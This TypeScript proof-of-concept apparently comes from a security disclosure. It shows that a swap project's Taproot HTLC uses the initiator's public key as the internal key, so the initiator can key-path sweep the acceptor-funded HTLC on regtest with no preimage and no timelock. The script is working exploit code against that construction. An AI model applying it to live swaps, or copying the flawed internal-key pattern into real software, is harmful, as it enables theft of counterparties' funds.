/**
 * PoC: The swap HTLC's Taproot internal key is the INITIATOR's plain pubkey.
 * Therefore the initiator can key-path spend BOTH HTLCs — including the
 * acceptor-funded one — at any time, with no preimage and no timelock.
 *
 * This script proves the initiator can produce a consensus-valid key-path
 * signature for the acceptor's HTLC output using only their own private key.
 */
import * as bitcoin from 'bitcoinjs-lib';
import { ECPairFactory } from 'ecpair';
import * as ecc from 'tiny-secp256k1';
import { PureBitcoinSwap } from './src/lib/PureBitcoinSwap';

const ECPair = ECPairFactory(ecc);
const network = bitcoin.networks.regtest;

// Actors
const initiator = ECPair.makeRandom({ network });
const acceptor = ECPair.makeRandom({ network });
const attackerLoot = ECPair.makeRandom({ network }); // initiator-controlled destination

const preimage = Buffer.alloc(32, 0x11);
const hashLock = Buffer.from(bitcoin.crypto.sha256(preimage));
const secondLockTime = 1000;

// === This is exactly how App.tsx step 3 / server.ts:899 build the acceptor's HTLC ===
const secondHtlc = PureBitcoinSwap.createTaprootHtlc(
    Buffer.from(initiator.publicKey),   // <-- internalPubKey = initiator's key (!!)
    hashLock,
    Buffer.from(initiator.publicKey),   // recipient (claim leaf) = initiator
    Buffer.from(acceptor.publicKey),    // refund leaf = acceptor, after secondLockTime
    secondLockTime,
    network
);
console.log('Acceptor-funded HTLC address:', secondHtlc.address);

// === The initiator now key-path spends it. No preimage, no timelock. ===
const htlcValue = 100_000n;
const fakeFundingTxid = 'aa'.repeat(32);

const tx = new bitcoin.Transaction();
tx.version = 2;
tx.addInput(Buffer.from(fakeFundingTxid, 'hex').reverse(), 0);
tx.addOutput(
    bitcoin.address.toOutputScript(
        bitcoin.payments.p2tr({ internalPubkey: PureBitcoinSwap.getXOnlyPubKey(Buffer.from(attackerLoot.publicKey)), network }).address!,
        network
    ),
    htlcValue - 1000n
);

// Standard BIP341 key-path sighash over the HTLC output
const sighash = tx.hashForWitnessV1(
    0,
    [secondHtlc.output!],
    [htlcValue],
    bitcoin.Transaction.SIGHASH_ALL
);

// The merkle root committed by the script tree (needed for the tweak)
const claimLeafHash = PureBitcoinSwap.tapleafHash(PureBitcoinSwap.createHtlcClaimScript(hashLock, Buffer.from(initiator.publicKey)));
const refundLeafHash = PureBitcoinSwap.tapleafHash(PureBitcoinSwap.createHtlcRefundScript(Buffer.from(acceptor.publicKey), secondLockTime));
const merkleRoot = Buffer.from(
    bitcoin.crypto.taggedHash(
        'TapBranch',
        Buffer.concat([claimLeafHash, refundLeafHash].sort(Buffer.compare))
    )
);

// Initiator tweaks THEIR OWN private key — no acceptor involvement
const tweakedInitiator = PureBitcoinSwap.getTweakedKeyPair(initiator, merkleRoot, network);
const sig = tweakedInitiator.signSchnorr(sighash);

// Consensus check: BIP341 verifies the schnorr sig against the OUTPUT key of the UTXO
const outputKey = secondHtlc.pubkey!; // x-only tweaked output key from the p2tr payment
const valid = ecc.verifySchnorr(sighash, outputKey, Buffer.from(sig));

console.log('Output (tweaked) key:      ', Buffer.from(outputKey).toString('hex'));
console.log('Tweaked initiator pubkey:  ', Buffer.from(PureBitcoinSwap.getXOnlyPubKey(Buffer.from(tweakedInitiator.publicKey))).toString('hex'));
console.log('BIP341 key-path signature verifies against HTLC output key:', valid);

if (!valid) { console.error('PoC FAILED'); process.exit(1); }
console.log('\n=> Initiator can unilaterally sweep the acceptor-funded HTLC at any time.');
console.log('   Same construction applies to the first HTLC (initiator can reclaim it early, too).');
